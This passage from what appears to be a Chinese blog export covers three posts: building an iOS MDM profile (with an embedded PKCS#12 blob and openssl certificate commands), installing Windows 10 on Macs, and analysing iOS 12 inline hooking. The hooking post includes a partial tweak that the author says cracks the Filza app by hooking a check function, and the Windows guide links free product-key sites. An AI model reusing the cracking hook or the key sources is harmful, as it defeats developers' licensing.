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 e96ah6AF/AQIVFgg47LiiYwCAggA &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#12 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Identity.p12&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs12.E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs12&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;MDM enbale server manage your device&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;XXX MDM&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.mgmt.External.3a3c70d4-cc4f-4713-xxxx-f38d6fd7xxxx&lt;/string&gt; &lt;key&gt;PayloadOrganization&lt;/key&gt; &lt;string&gt;XXX&lt;/string&gt; &lt;key&gt;PayloadRemovalDisallowed&lt;/key&gt; &lt;false/&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;Configuration&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;D633CDFE-9806-4224-AD38-7FE0CAB12163&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;/plist&gt; 上面直接用那个工具填写相关信息并导入相关证书就能生成，但是真正的MDM策略相关需要手动添加一个字典如下： &lt;dict&gt; &lt;key&gt;AccessRights&lt;/key&gt; &lt;integer&gt;8191&lt;/integer&gt; &lt;key&gt;CheckInURL&lt;/key&gt; &lt;string&gt;https://mdmapi.demo.com/checkin&lt;/string&gt; &lt;key&gt;CheckOutWhenRemoved&lt;/key&gt; &lt;true/&gt; &lt;key&gt;IdentityCertificateUUID&lt;/key&gt; &lt;string&gt;E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;Configures MobileDeviceManagement.&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.mdm.2C62A547-9CA9-4D5A-AF86-0DF2467274EF&lt;/string&gt; &lt;key&gt;PayloadOrganization&lt;/key&gt; &lt;string&gt;Developer Insider&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.mdm&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;E7438708-331E-4E68-99BC-3B9B435DF3DC&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;key&gt;ServerURL&lt;/key&gt; &lt;string&gt;https://mdmapi.demo.com/server&lt;/string&gt; &lt;key&gt;SignMessage&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Topic&lt;/key&gt; &lt;string&gt;com.apple.mgmt.External.3a3c70d4-cc4f-4713-xxxx-f38d6fd7xxxx&lt;/string&gt; &lt;key&gt;UseDevelopmentAPNS&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; 这里简单说几个比较重点的字段 KEY TYPE DESCRIPTION IdentityCertificateUUID String Mandatory. UUID of the certificate payload for the device’s identity. It may also point to a SCEP payload. You need to use the PayloadUUID of the identity.p12 in this field. PayloadUUID String Mandatory. Here you need to generate a UUID. You can use uuidgen to generate an UUID and then copy paste that UUID in this field. UUID looks like this 34995C2E-XXXX-XXXX-XXXX-D6DB637A1D6E PayloadIdentifier String Here you need to append the UUID in after com.apple.mdm. which we generated in last step. Your payload identifier looks like this com.apple.mdm.34995C2E-XXXX-XXXX-XXXX-D6DB637A1D6E Topic String Mandatory. The topic that MDM listens to for push notifications. The certificate that the server uses to send push notifications must have the same topic in its subject. The topic must begin with the com.apple.mgmt.External.hexstuffhere... prefix. ServerURL String Mandatory. The URL that the device contacts to retrieve device management instructions. Must begin with the https:// URL scheme, and may contain a port number (https://YOUR_HOSTNAME_OR_IP:PORT/server, for example). CheckInURL String Optional. The URL that the device should use to check in during installation. Must begin with the https:// URL scheme and may contain a port number (https://YOUR_HOSTNAME_OR_IP:8080/checkin, for example). If this URL is not given, the ServerURL is used for both purposes. CheckOutWhenRemoved Boolean Optional. If true, the device attempts to send a CheckOutmessage to the check-in server when the profile is removed. Defaults to false. AccessRights Integer, flags Required. Logical OR of the following bit-flags:1: Allow inspection of installed configuration profiles.2: Allow installation and removal of configuration profiles.4: Allow device lock and passcode removal.8: Allow device erase.16: Allow query of Device Information (device capacity, serial number).32: Allow query of Network Information (phone/SIM numbers, MAC addresses).64: Allow inspection of installed provisioning profiles.128: Allow installation and removal of provisioning profiles.256: Allow inspection of installed applications.512: Allow restriction-related queries.1024: Allow security-related queries.2048: Allow manipulation of settings.4096: Allow app management.May not be zero. If 2 is specified, 1 must also be specified. If 128 is specified, 64 must also be specified. UseDevelopmentAPNS Boolean Optional. If true, the device uses the development APNS servers. Otherwise, the device uses the production servers. Defaults to false. Note that this property must be set to false if your Apple Push Notification Service certificate was issued by the Apple Push Certificate Portal. That portal only issues certificates for the production push environment. IdentityCertificateUUID：这个UUID是identity.p12的PayloadUUID。关于identity.p12这里其实是一个设备标识的证书，这个证书可能不知道怎么制作。其实用自签的签名就行。制作流程如下 生成自签证书（生成2046位的加密私钥） openssl genrsa -out server.key 2048 生成自签证书（生成证书签名请求） openssl req -new -key server.key -out server.csr 生成自签证书（生成类型为X509的自签名证书） openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt 这时候我们有server.key、server.csr、server.crt三个文件 然后将server.crt复制生成两个文件并命名：identity.crt、server.crt 同样将server.key复制生成两个文件并命名：cakey.key、identity.key 最后将server.csr重命名为identity.csr 然后用make_certs.sh生成Identity.p12 AccessRights：这个字段会在安装描述文件的时候提示申请了哪些权限，并且这里是按位与运算 CheckInURL以及ServerURL涉及到后面MDM设备、苹果APNS、服务器三方通信相关 签名描述文件在签名前建议先对未签名的描述文件进行通信测试，保证在未签名之前安装描述文件以后服务端能够正常发送指令通信。 这里的签名仅仅是为了部署描述文件，和MDM本身并不相关，所以事实上可以用任意一个证书进行签名，但为了保证是公司发布的描述文件，建议用公司的iOS开发证书即可。这里提供两个工具 Hancock App ProfileSigner 使用比较简单，这里不再介绍。 MDM通信指令结构及原理分析暂位，后面有时间再补充 企业MDM最佳方案虽然MDM自身提供了很多远程指令相关的移动设备管理功能，但是在实际上企业管理中还远远不够，所以建议配合一个agent之类的app辅助。在我们实现中，采用安装描述文件的时候就推送安装agent，然后用户后续的所有交互都由app负责。app主要作用在于能够获取定位，账号设备绑定，安全准入，扫码登录等等。以及能够提供公司级的VPN等相关公司配置。这里能做的还有很多，可以和企业实际的管理结合。 参考 https://developerinsider.co/how-to-create-a-verified-ios-mobile-device-management-mdm-profile/ https://github.com/vineetchoudhary/Apple-iOS-MDM-Server https://micromdm.io/blog/certificates/ https://osxdominion.wordpress.com/2015/04/21/signing-mobileconfig-profiles-with-keychain-certificates/ https://micromdm.io/blog/certificates/ &gt;!!!&lt; https://github.com/micromdm/micromdm","tags":[{"name":"wiki","slug":"wiki","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"},{"name":"MDM","slug":"MDM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/MDM/"}]},{"title":"Mac安装Win10完整指南","date":"2019-08-21T05:44:54.000Z","path":"2019/08/21/mac-install-windows/mac-install-windows/","text":"Mac安装Win10完整指南 关于win10你想要的安装方式，各种姿势以及各种坑和解决方案都在这里 开始对于某些软件只有win版本或者在win上性能更好，这时候你就会想装win系统了。一般来说有两种选择，一是用虚拟机，二是装双系统。然而虚拟机太慢太卡，而且还和双系统存在同一个问题在于会和mac自身系统占用同一块磁盘，对于256G大小的磁盘空间来说相当限制。如果你现在想装Windows或者正遇到问题，那么这篇笔记应该能解决你的问题。我会尽可能把我在安装过程中遇到的问题以及解决方案都描述清楚。 那么这里还提供一种方案就是将win装在外置磁盘上面，这样上面的问题都得到的解决，因为现在的外置SSD速度已经相当快，完全能满足将一个操作系统放到外置SSD的需求。不仅如此，我还尝试了在外置SSD上面装双系统，这样可以将一块SSD磁盘的利用率最大化。 作为对比，我这里会将所有的安装方式都尝试一遍。将会安装以下顺序介绍mac上面安装win的具体方案。 用虚拟机安装win10 用BootCamp安装win10 用移动SSD安装win10 用移动SSD安装装系统 虚拟机安装win10对于虚拟机安装win10，只需要把镜像文件放到VMWare等虚拟机内一直下一步就能安装，这里就不再介绍这种方式。 BootCamp安装win101 、Bootcamp全自动安装早就听说在最新的macOS系统版本中，用BootCamp能很简单的安装Windows，既然如此决定先用BootCamp试试。这里你首先需要下载一个Windows的iso镜像文件，我这里提供几个下载的地址 https://msdn.itellyou.cn/ https://tb.rg-adguard.net/public.php?lang=zh-CN https://www.microsoft.com/zh-cn/software-download/windows10ISO （我是在官网下载的镜像） win10镜像准备好以后，用BootCamp装的时候选择该镜像并分配50G的分区。点击下一步，下载完相关驱动以后（连VPN，不然有点慢）进行分区，结果就提示分区失败了。去网上搜了一下，大多数人都说由于最新分区采用的APFS导致得，一堆解决方案。主要都说采用系统降级的方式，或者由于修复time machine造成的分区错误，或者磁盘加密的缘故。但是很明显我刚装的系统不存在这些问题。 又重新尝试了几次，还是不行，快怀疑苹果BootCamp的问题了。 还有人提示可以进入单用户模式（command+s）然后用fsck_apfs或者fsck命令去修复磁盘。 但是上面的都做了以后还是不行。 2、Bootcamp+启动盘+手动分区既然BootCamp自动安装不了，那选择手动安装吧。这个原理也不复杂，BootCamp最主要工作在于下载驱动+分区+引导win系统。然后这些我们实际上可以手动完成。 制作启动盘 这里可以找一个U盘来制作win10的启动盘，由于我这里是移动硬盘，所以我分了一个10G的区来作为启动盘。这里制作需要unetbootin来完成制作，这个软件支持mac、win、linux平台。我下载了mac版的。 分别选择win10的iso镜像，以及选择对应的设备。如果不清楚你的设备是哪一个，可以输入diskutil list去找到对应的设备名，点击ok等待一会，就这样启动盘就制作完成了。 手动分区 这里的分区是指将mac主硬盘分一个区来安装Windows，由于这里需要安装Windows，所以只能用Windows支持的磁盘格式，最开始我分了一个50G的FAT32分区，然后用启动盘安装发现不能选择该磁盘。后面经过一番研究，才发现。Windows磁盘需要NTFS格式的分区，但是这里有个问题在于mac不支持NTFS格式的操作。于是乎，搜索了一番，发现可以安装一些软件、驱动让mac支持NTFS格式。这里提供两种软件供参考ParagonNTFS和tuxera-ntfs但都是收费的。安装完以后终于能分NTFS格式的区了，但是有个头疼的问题在于只能分30G以下才会成功，大于30G就提示失败。但是如果分区是30G的话，启动盘选择磁盘的时候又会提示需要大于40G的磁盘，这里不是矛盾了吗。 重装mac系统由于上面手动分区也不行，我就重装了mac系统。由于我之前制作了mojave最新系统的mac启动盘，所以重装还是比较快。建议制作一个mac系统盘备用。这里简单说下制作过程。 同样给硬盘分一个10G的区 下载macOS系统，这里比如Install macOS Mojave sudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume执行里面的createinstallmedia命令，选择上面的分区就制作完成了。 如果还有问题可以点这里 重装完以后，我试了下用BootCamp安装，发现一路畅通，直接到引导了Windows系统安装的步骤，但是这里又有问题了。 WTF？你自己刚分好的区，现在又给我说不行了？这里还真没办法。不过我回到macOS用磁盘工具发现，虽然不能安装Windows，但却给我分好了一个NTFS格式的区。既然有了这个区，那我直接用上面制作的启动盘手动安装Windows不就完了。 重启电脑，按住option按钮，选择那个win启动盘，到选择Windows安装磁盘的步骤，发现BootCamp分的那个区是可以用的，于是我就格式化了那个磁盘，然后选择它，果然安装成功了。这一刻我饱含泪水，终于把Windows安装成功了。经过一番设置，顺利进入win10系统，顺便说下感觉win10还不错，无论是画质还是系统设计，已经比win7好太多。 当我以为一切就这样结束的时候，发现Windows不能连wifi，不过突然想起，由于我是手动安装的Windows，所以并没有安装相关驱动，导致wifi模块并不能识别。还好BootCamp提供了手动下载驱动支持文件的选项，这里由于需要在win10中访问并运行驱动安装程序，所以我又分了一个FAT32的区专门提供win10访问。把下载的驱动程序放入这个分区，重启进入win10系统，运行里面的安装程序以后，wifi就能连接上了。 最后我为了体验完整的win10系统，还在淘宝上买了一个激活码，成功激活为正版win10。不过我这里也提供几个免费的key，但不一定可靠，嫌麻烦可以花几块钱去淘宝买。 https://productkeysdl.com/windows-10-product-key/ http://www.ylmfwin100.com/ylmf/8642.html 双系统win10使用体验win10装好以后，体验了下IDA，加载dyld_cache后发现是真的比mac和虚拟机装的IDA流畅很多。也不费我这么多精力去装双系统。不过由于我的mac磁盘一共才256G，所以我下一步的打算是买一个移动SSD硬盘来装Windows，整个系统都运行在外置的SSD硬盘，看了下现在移动固态硬盘的速度，应该是没什么问题的。暂选三星T5、500G、540M/s那款。 外置SSD硬盘安装win10前面说到了双系统上的win10体验，就速度、性能来说已经很不错了。但是为什么还要用外置SSD来安装win10呢。这里涉及到我的mac只有256G硬盘，还要划分一部分来安装win10，这样两个系统可用空间都很小。我买的三星T5移动固态硬盘到手了，准备把win10直接安装到上面。由于现在移动固态硬盘的速度完全能够支持这样的方式。 最开始我的尝试在这之前，我先按照自己的想法去实现外置SSD安装win10。刚开始想，我之前制作了启动盘，那么我直接从启动盘启动以后把win10选择外置SSD不就行了吗。直到我进行到那一步的时候才发现，win10为了各方面原因是阻止你将系统安装到外置磁盘上面的。 正确安装步骤这里有个视频演示了整个过程，不熟悉的可以先看下这个视频。 https://9to5mac.com/2017/08/31/how-windows-10-mac-boot-camp-external-drive-video/ https://www.youtube.com/watch?v=kR28kVtZYJY&amp;feature=youtu.be 前提准备： win10镜像 vmware虚拟机或移动硬盘 WinToUSB WindowsSupport驱动（通过BootCamp下载） 有线鼠标和键盘（设置win10的时候由于没有驱动，键盘和触控板不能识别） 下面说下大概需要哪些步骤去完成： 用虚拟机或者其他win电脑用WinToUSB去制作WINTOGO启动盘，这里WinToUSB使用简单就不再介绍，选择对应的win10镜像文件和外置SSD磁盘等待制作完成就行。 这里将下载的WindowsSupport复制进上面的WINTOGO启动盘之中或者等安装完以后用其他硬盘拷贝到win10中然后安装驱动也行。 到这一步直接重启按住option选择WINTOGO启动盘安装win10系统就行，整个过程就是需要连接有线鼠标和键盘。 当进入win10系统以后，由于没有驱动，导致蓝牙、wifi等等都不能工作。这时候选择WindowsSupport里面的驱动安装重启以后一切都正常了。 外置SSD安装win10使用感受首先使用上面来说和内置的磁盘差别不大，依然很流畅。但有以下优势，随身携带了一个系统，只要有一台电脑立马能进入你的工作环境；与内置系统有很好的独立性，且不用担心内置系统和外置系统磁盘空间大小。 如果说缺点的话就是外置SSD与电脑是用有线连接，存在误触导致系统可能发生panic。不过就三星T5来看，连接的数据线还是比较牢固的。整个三种方式安装来了，我选择了最后这种。满足了性能，独立，空间等方方面面的优势。建议有这方面需求的都采用外置SSD来安装运行win10。 外置SSD硬盘安装macOS和win10双系统前面提到，我在买来的三星T5上面装了win10系统，但是整个500G用来只装win10始终觉得有点浪费。于是想着能不能在外置SSD上装双系统。刚开始以为很简单，结果这里坑很多也很大。如果你对磁盘分区，引导系统等不是很熟悉的话，建议一定要谨慎操作并做好数据备份。 准备条件 win10镜像 一台win电脑（最好不要用虚拟机，虚拟机操作很卡很慢） 一台mac电脑 两个外置硬盘，一个SSD用作装装系统，一个用作制作引导盘和数据传输（建议使用一般机械硬盘即可，容量大一点）。 一个macOS系统引导盘 WinToUSB 用作制作win10系统外置SSD引导盘。 diskgenius 这个工具十分重要，没有这个磁盘工具无法完成。用作各种细腻化磁盘分区管理 有线鼠标和键盘（设置win10的时候由于没有驱动，键盘和触控板不能识别） WindowsSupport驱动（通过BootCamp下载） 最初想法和尝试 先装win10，失败 最开始的我想法就是先直接在移动SSD上面装一个win10，然后再进行分区（exFAT、APFS或者其他mac上能识别挂载的文件系统都行）。接着再回到macOS中，用磁盘工具抹掉并设置为APFS格式的分区。这样在用系统引导盘去安装的时候选择该分区不就行了。 失败原因：在这样操作的时候，回到macOS对这个分区进行格式化的时候会出现错误，而且那个win10系统也不能引导了，原因在于会将win10系统前面的引导分区覆盖。 先装macOS，失败 上面的方案失败以后我就尝试先装macOS，装macOS就十分简单，直接将整个磁盘格式化为APFS格式，然后分一个exFAT或者NTFS的区留着装win10。装macOS就直接用引导盘然后选择APFS那个分区安装就可以了。接下来就回到win系统中，用WinToUSB工具安装win10，然而这个工具并不能按照磁盘分区来进行安装，最小单位是磁盘设备，也就是说，这样会将整个磁盘都格式化安装为win10，这样做的话前面安装的macOS系统就会被删除。 失败原因：WinToUSB按磁盘设备而不是磁盘分区来安装的win10。 最终解决方案根据前面的失败情况，理性分析了一下，在没有更好的工具替换WinToUSB的情况下，要想实现在移动SSD安装双系统，只能先装win10。但是前面先装win10却失败了，下面经过大量的尝试，找出了一个很大的坑，也找出了失败的原因。 装完win10以后，如果你分一个APFS区到mac上面抹掉的时候，出现不能win10不能引导以及磁盘不能挂载的原因是，macOS挂载APFS分区的时候是需要一个200M的EFI分区进行引导。这个是mac系统独有的，在win上面挂载分区是不需要这玩意的。所以出现前面问题的原因是，由于需要200M的EFI引导分区，所以抹掉的时候会将win10的引导分区给覆盖掉，从而导致不能启动win10。而为什么自身的APFS也不能挂载，是因为前面的win10引导分区只有100M，小于200M，所以APFS分区也不能挂载。 弄清楚原因以后，那么现在就好办了。按照以下步骤 先用WinToUSB安装win10 然后用diskgenius备份win10的引导分区，等装完macOS以后再写回去。 用diskgenius创建一个APFS或者其他mac上能识别的分区。（大小就为磁盘的一半，后面会在上面装macOS） 然后用diskgenius调整win10前面的EFI引导分区大小，这里只要大于200M都行。此步需要十分谨慎，建议不熟悉的先搜索相关资料，对整个有一个清晰的了解以后再动手。 接下来回到mac系统中，用磁盘工具抹掉APFS分区，这样这个分区就能挂载了 随后用引导盘安装macOS系统到这个分区上面，此时的win10还是不能启动的。 macOS系统装完以后，在回到win系统，将前面备份的win10引导分区数据用diskgenius复制到前面的EFI分区之中。 重启电脑，验证两个系统是否都能正常启动即可。 这里说了安装过程中遇到的问题以及解决方法，但没有用截图或者更加详细的步骤。主要还是提供了在外置SSD上安装双系统的思路，如果后面有时间的话，会将整个过程以截图的方式详细的介绍出来。我个人建议就是对磁盘分区和系统引导不是很熟悉的新手来说，建议先不要尝试这种方案，等你熟悉或者我写了更详细的步骤以后再进行尝试。 win10下IDA启动失败的解决方案 无法启动IDA，缺少相关DLL 在安装完win10以后，打开IDA会提示相关的DLL无法找到。这里提供了dll缺失文件下载地址以及Windows 10上msvcp140.dll缺少问题的解决办法。 https://cn.dll-files.com/ http://www.win10jihuoma.com/archives/8183 启动后某些DLL加载失败 在启动IDA的时候我还遇到一个错误是无法加载ida目录下plugins下的DLL，提示跟多._开头的DLL文件加载失败，这些文件是mac系统记录的元数据文件，大小都在4k左右，肯定不能加载。删除了loader proc 和plugins下面的这些文件就正常了。关于这些文件的解释看这里。其他IDA启动问题可以看下面官方的文档 https://www.hexblog.com/?p=1132 参考 https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk https://www.microsoft.com/zh-cn/software-download/windows10ISO https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/ http://www.win10jihuoma.com/archives/category/win10zhuanyeban https://discussions.apple.com/thread/6832480 https://medium.com/@svenkirsime/install-windows-on-the-external-ssd-hdd-for-your-mac-5d29eefe5d1 https://www.cnblogs.com/lonecloud/p/7107063.html","tags":[{"name":"wiki","slug":"wiki","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"},{"name":"windows","slug":"windows","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/windows/"}]},{"title":"iOS12内存patch remap bug分析","date":"2019-08-15T16:22:28.000Z","path":"2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/","text":"iOS12内存patch remap bug分析 之前在做LLDB中的内存patch的时候提到在iOS12(包括iOS11)上面remap会出现bug的问题，一直相当困扰。其他hook框架都能在最新越狱上面正常patch，为什么我写的就不行？所以这篇文章准备一探究竟，但是目前我也还么搞清楚原因。（2019/09/04终于搞清楚了原因）不过这里会先分析最新系统上面两种hook框架对于inlinehook的原理及其相关细节。先看下他们的hook框架是如何实现内存patch和hook的。 iOS12 MSHookFunction分析(CoolStar越狱工具) 环境：iPhoneXS A12 iOS12 jailbreak by Chimera 在iOS12越狱上面CydiaSubstrate指向的是libsubstrate.dylib /Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib 我们常用的MSHookFunction函数的实现就是在libsubstrate.dylib这里面，不过在这里仅仅是SubHookFunction的封装。而SubHookFunction的实现却是在/usr/lib/libsubstitute.0.dylib这里 /usr/lib/libsubstitute.0.dylib是一个软连接指向libsubstitute.dylib。这里的libsubstitute.dylib就是coolstar维护的版本。下面分析libsubstitute.dylib的inlinehook实现细节。 下面是我写的一个tweak插件代码（没错就是破解Filza的，不过只是部分代码），hook了_ZTL7624417887函数。 static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){ NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0); return 0; } %ctor{ MSImageRef image = MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;); NSLog(@&quot;===xxx===image:%p&quot;, image); void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;); NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887); MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887); } 调试分析 对MSHookFunction下断点，发现断在了我们预想的位置。 CydiaSubstrate`MSHookFunction: -&gt; 0x10550fca0 &lt;+0&gt;: cbz x0, 0x10550fca8 ; &lt;+8&gt; 0x10550fca4 &lt;+4&gt;: b 0x10550fe80 ; symbol stub for: SubHookFunction 0x10550fca8 &lt;+8&gt;: ret (lldb) re re General Purpose Registers: x0 = 0x000000010489a068 Filza`ZTL7624417887 x1 = 0x00000001055bbbec xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19 x2 = 0x00000001055bc148 xkfilza.dylib`original_ZTL7624417887 * frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29 frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424 frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40 X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。 先看一下这三个地址的数据，如下所见，此时ZTL7624417887还没有hook，所以前几个指令没有变化。 // ZTL7624417887 函数指令 (lldb) x/5i 0x000000010489a068 0x10489a068: 0xd2800008 mov x8, #0x0 0x10489a06c: 0xf0003489 adrp x9, 1683 0x10489a070: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x10489a074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x10489a078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x00000001055bbbec 0x1055bbbec: 0xd503237f pacibsp 0x1055bbbf0: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x1055bbbf4: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x1055bbbf8: 0x910083fd add x29, sp, #0x20 ; =0x20 0x1055bbbfc: 0xb81fc3a0 stur w0, [x29, #-0x4] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x00000001055bc148 0x1055bc148: 0x0000000000000000 0x0000000000000000 0x1055bc158: 0x0000000000000000 0x0000000000000000 0x1055bc168: 0x0000000000000000 这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据 // ZTL7624417887 函数指令 (lldb) x/5i 0x000000010489a068 0x10489a068: 0xb0006911 adrp x17, 3361 0x10489a06c: 0x912fb231 add x17, x17, #0xbec ; =0xbec 0x10489a070: 0xd61f0220 br x17 0x10489a074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x10489a078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x00000001055bbbec 0x1055bbbec: 0xd503237f pacibsp 0x1055bbbf0: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x1055bbbf4: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x1055bbbf8: 0x910083fd add x29, sp, #0x20 ; =0x20 0x1055bbbfc: 0xb81fc3a0 stur w0, [x29, #-0x4] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x00000001055bc148 